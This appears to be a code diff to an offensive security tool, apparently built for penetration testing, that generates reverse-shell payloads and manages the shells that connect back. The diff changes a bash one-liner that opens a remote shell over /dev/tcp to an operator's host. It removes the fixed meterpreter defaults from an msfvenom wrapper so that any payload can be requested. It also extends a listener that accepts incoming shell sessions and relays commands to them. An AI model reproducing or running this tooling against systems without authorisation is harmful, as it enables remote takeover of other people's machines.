@@ -66,8 +66,8 @@ class PayloadGenerator:
     def bash_tcp(cls, lhost: str, lport) -> str:
         host, port = cls._validate(lhost, lport)
         return (
-            f"/bin/bash -c 'sh -i 5<> /dev/tcp/{host}/{port};"
-            f" cat <&5 | while read line; do $line 2>&5 >&5; done'"
+            f"0<&196;exec 196<>/dev/tcp/{host}/{port}; "
+            f"sh <&196 >&196 2>&196"
         )
 
     @classmethod
@@ -156,22 +156,6 @@ class PayloadGenerator:
 class MsfvenomWrapper:
     """Wrap msfvenom. No shell=True, no string interpolation."""
 
-    DEFAULT_PAYLOADS = {
-        "windows_exe": "windows/x64/meterpreter/reverse_tcp",
-        "linux_elf": "linux/x64/meterpreter/reverse_tcp",
-        "windows_x86_exe": "windows/meterpreter/reverse_tcp",
-    }
-    DEFAULT_FORMATS = {
-        "windows_exe": "exe",
-        "linux_elf": "elf",
-        "windows_x86_exe": "exe",
-    }
-    DEFAULT_EXTENSION = {
-        "windows_exe": ".exe",
-        "linux_elf": ".elf",
-        "windows_x86_exe": ".exe",
-    }
-
     @staticmethod
     def _which() -> str:
         path = shutil.which("msfvenom")
@@ -182,37 +166,41 @@ class MsfvenomWrapper:
     @classmethod
     def generate(
         cls,
-        target_kind: str,
+        payload: str,
         lhost: str,
         lport,
+        fmt: str = "exe",
         out_name: Optional[str] = None,
         encoder: Optional[str] = None,
         iterations: int = 0,
         dry_run: bool = False,
     ) -> tuple[List[str], Optional[str]]:
-        if target_kind not in cls.DEFAULT_PAYLOADS:
-            raise ValueError(
-                f"Unsupported target kind: {target_kind!r}. "
-                f"Choose from: {list(cls.DEFAULT_PAYLOADS)}"
-            )
         host = SecureInputValidator.validate_host(lhost)
         port = SecureInputValidator.validate_port(lport)
+        safe_payload = (payload or "").strip()
+        if not safe_payload:
+            raise ValueError("msfvenom payload must not be empty")
+        if "\n" in safe_payload or "\r" in safe_payload:
+            raise ValueError("msfvenom payload contains line breaks")
+        safe_fmt = (fmt or "exe").strip()
+        if not all(c.isalnum() or c in "_-" for c in safe_fmt):
+            raise ValueError(f"unsafe msfvenom format: {safe_fmt!r}")
 
         ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
         safe_name = SecureInputValidator.safe_filename_fragment(
-            out_name or f"payload_{target_kind}_{ts}"
+            out_name or f"payload_{ts}"
         )
-        fmt = cls.DEFAULT_FORMATS[target_kind]
-        ext = cls.DEFAULT_EXTENSION[target_kind]
+        ext_map = {"exe": ".exe", "elf": ".elf", "raw": ".bin", "python": ".py",
+                    "bash": ".sh", "psh": ".ps1", "dll": ".dll"}
+        ext = ext_map.get(safe_fmt, "." + safe_fmt)
         out_path = os.path.join(EXPORTS_DIR, safe_name + ext)
-        payload = cls.DEFAULT_PAYLOADS[target_kind]
 
         argv = [
             cls._which(),
-            "-p", payload,
+            "-p", safe_payload,
             f"LHOST={host}",
             f"LPORT={port}",
-            "-f", fmt,
+            "-f", safe_fmt,
             "-o", out_path,
         ]
         if encoder:
@@ -224,7 +212,7 @@ class MsfvenomWrapper:
             action="msfvenom.generate",
             host=host,
             detail=(
-                f"target={target_kind} payload={payload} lport={port} "
+                f"payload={safe_payload} format={safe_fmt} lport={port} "
                 f"out={out_path} dry_run={dry_run}"
             ),
         )
@@ -333,6 +321,7 @@ class Session:
     _on_output: Optional[Callable[[str], None]] = None
     _on_closed: Optional[Callable[[], None]] = None
     _lock: threading.Lock = field(default_factory=threading.Lock)
+    _pre_attach_buffer: List[str] = field(default_factory=list)
 
     def __post_init__(self):
         ts = self.started_at.strftime("%Y%m%d_%H%M%S")
@@ -386,8 +375,17 @@ class Session:
         t.start()
 
     def attach_output(self, on_output: Callable[[str], None]) -> None:
-        """Replace the output callback (used by GUI to attach a session terminal)."""
+        """Replace the output callback and flush any buffered pre-attach data."""
         self._on_output = on_output
+        # Flush any data queued before the GUI attached
+        with self._lock:
+            buffered = self._pre_attach_buffer[:]
+            self._pre_attach_buffer.clear()
+        for line in buffered:
+            try:
+                on_output(line)
+            except Exception:
+                pass
 
     def _reader_loop(self) -> None:
         try:
@@ -405,11 +403,16 @@ class Session:
                 if not data:
                     break
                 self._append_transcript("RECV", data)
+                decoded = data.decode(errors="replace")
                 if self._on_output:
                     try:
-                        self._on_output(data.decode(errors="replace"))
+                        self._on_output(decoded)
                     except Exception:
                         pass
+                else:
+                    self._pre_attach_buffer.append(decoded)
+                    if len(self._pre_attach_buffer) > 100:
+                        self._pre_attach_buffer.pop(0)
         finally:
             self.alive = False
             try:
@@ -430,8 +433,9 @@ class Session:
     def send(self, data: str) -> bool:
         if not self.alive:
             return False
-        if not data.endswith("\n"):
-            data = data + "\n"
+        eol = "\r\n" if self.os_hint == "windows" else "\n"
+        if not data.endswith(eol):
+            data = data.rstrip("\n").rstrip("\r") + eol
         payload = data.encode("utf-8", errors="replace")
         try:
             self.sock.sendall(payload)
@@ -574,7 +578,7 @@ class ReverseShellManager:
 
     def stop_listener(self, lid: str) -> bool:
         with self._lock:
-            listener = self._listeners.get(lid)
+            listener = self._listeners.pop(lid, None)
         if not listener:
             return False
         listener.alive = False
@@ -605,70 +609,79 @@ class ReverseShellManager:
             return
         srv = listener.server_sock
         srv.settimeout(1.0)
-        while listener.alive:
-            try:
-                sock, addr = srv.accept()
-            except socket.timeout:
-                continue
-            except OSError:
-                break
+        try:
+            while listener.alive:
+                try:
+                    sock, addr = srv.accept()
+                except socket.timeout:
+                    continue
+                except OSError:
+                    break
 
-            peer_ip, peer_port = addr[0], addr[1]
-            try:
-                if listener.protocol == PROTO_SSL and listener.ssl_context:
-                    sock = listener.ssl_context.wrap_socket(sock, server_side=True)
-                elif listener.protocol == PROTO_HTTP:
+                peer_ip, peer_port = addr[0], addr[1]
+                try:
+                    if listener.protocol == PROTO_SSL and listener.ssl_context:
+                        sock = listener.ssl_context.wrap_socket(sock, server_side=True)
+                    elif listener.protocol == PROTO_HTTP:
+                        try:
+                            sock.settimeout(2.0)
+                            sock.recv(4096)
+                            sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
+                            sock.settimeout(None)
+                        except OSError:
+                            pass
+
+                    sid = uuid.uuid4().hex
+                    session = Session(
+                        sid=sid,
+                        sock=sock,
+                        peer_ip=peer_ip,
+                        peer_port=peer_port,
+                        listener_id=lid,
+                        protocol=listener.protocol,
+                    )
+                    with self._lock:
+                        self._sessions[sid] = session
+
+                    audit(
+                        action="rs.session.open",
+                        host=peer_ip,
+                        detail=(
+                            f"sid={sid} listener={lid} "
+                            f"proto={listener.protocol} src_port={peer_port}"
+                        ),
+                    )
+
+                    def _on_closed(s=sid):
+                        self._cleanup_session(s)
+
+                    def _no_output(_text):
+                        pass
+
+                    session.start_reader(on_output=_no_output, on_closed=_on_closed)
+                    if self._on_session_started:
+                        try:
+                            self._on_session_started(session)
+                        except Exception:
+                            pass
+                except (ssl.SSLError, OSError) as exc:
                     try:
-                        sock.settimeout(2.0)
-                        sock.recv(4096)
-                        sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
-                        sock.settimeout(None)
+                        sock.close()
                     except OSError:
                         pass
-
-                sid = uuid.uuid4().hex
-                session = Session(
-                    sid=sid,
-                    sock=sock,
-                    peer_ip=peer_ip,
-                    peer_port=peer_port,
-                    listener_id=lid,
-                    protocol=listener.protocol,
-                )
-                with self._lock:
-                    self._sessions[sid] = session
-
-                audit(
-                    action="rs.session.open",
-                    host=peer_ip,
-                    detail=(
-                        f"sid={sid} listener={lid} "
-                        f"proto={listener.protocol} src_port={peer_port}"
-                    ),
-                )
-
-                def _on_closed(s=sid):
-                    self._cleanup_session(s)
-
-                def _no_output(_text):
-                    pass
-
-                session.start_reader(on_output=_no_output, on_closed=_on_closed)
-                if self._on_session_started:
-                    try:
-                        self._on_session_started(session)
-                    except Exception:
-                        pass
-            except (ssl.SSLError, OSError) as exc:
-                try:
-                    sock.close()
-                except OSError:
-                    pass
-                audit(
-                    action="rs.session.accept_fail",
-                    host=peer_ip,
-                    detail=f"listener={lid} err={exc!r}",
-                )
+                    audit(
+                        action="rs.session.accept_fail",
+                        host=peer_ip,
+                        detail=f"listener={lid} err={exc!r}",
+                    )
+        except Exception as exc:
+            audit(
+                action="rs.listener.crashed",
+                detail=f"lid={lid} err={exc!r}",
+            )
+            listener.alive = False
+            with self._lock:
+                self._listeners.pop(lid, None)
 
     def _cleanup_session(self, sid: str) -> None:
         with self._lock:
